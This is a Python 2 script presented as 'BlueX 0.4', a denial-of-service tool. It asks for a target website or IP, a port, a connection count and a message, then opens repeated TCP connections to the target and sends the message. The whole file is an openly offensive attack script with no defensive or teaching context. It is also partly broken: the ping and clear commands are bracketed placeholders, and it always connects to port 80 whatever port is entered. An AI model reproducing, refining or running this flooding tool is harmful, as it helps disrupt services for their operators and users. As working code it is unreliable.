import time
import socket
import os
import sys
import string

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
print ("Checking internet connection...")
print ("")
os.system('[ping command for your OS to google.com]')
os.system('[Clear command]')
print ("#######################################")
print ("#          BlueX 0.4 (Source)      #")
print ("#                                     #")
print ("#  Windows 95/98 support is active.   #")
print ("#  Remove BlueX95.exe to disable it.  #")
print ("#######################################")
print ("")
print ("Enter IP or Website to DDoS")
host=raw_input("> ")
print("")
print ("--------------------------------------------------")
print ("Enter port > for HTTP: 80 - default")
print ("           > for game server enter last 5 numbers")
print ("           |-> for example 12345")
port=input( "> " )
print ("")
print ("--------------------------------------------------")
print ("")
print ("How many connections do you want to send? ")
print ("Default is 100.")
conn=input("> ")
print ("")
print ("--------------------------------------------------")
print ("")
print ("Enter message for server")
print ("Default: Hello!")
message=raw_input("> ")
os.system('[Clear command]')
ip = socket.gethostbyname( host )
print ( "[BlueX] Staring attack to: "+host +", with IP: "+ ip +"")
print ("")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("[BlueX: 0x100] Error!")
    print ( "[BlueX: OK!] att.p-80 "+host +" / "+ ip +"")
    ddos.close()
for i in range(1, conn):
    dos()
print ("-------------------------------------------------------")
print ("[BlueX: F.OK!] "+host +" with IP: "+ ip +"")
if __name__ == "__main__":
    answer = raw_input("Continue? (Y/N)")
    if answer.strip() in "Y y".split():
        restart_program()
